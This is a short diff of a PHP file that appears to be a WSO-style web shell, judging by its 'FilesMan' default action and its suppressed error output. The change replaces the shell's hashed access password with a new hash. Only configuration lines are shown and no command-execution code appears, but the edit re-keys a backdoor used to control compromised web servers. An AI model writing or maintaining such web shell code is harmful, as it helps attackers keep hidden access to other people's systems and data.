@@ -8,7 +8,7 @@ session_start();
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 
-$password = "e880ef47f5221dfabe3248c324798371"; //asu
+$password = "3a0091d86bcb0b5349d818045f595dbe"; //asu
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
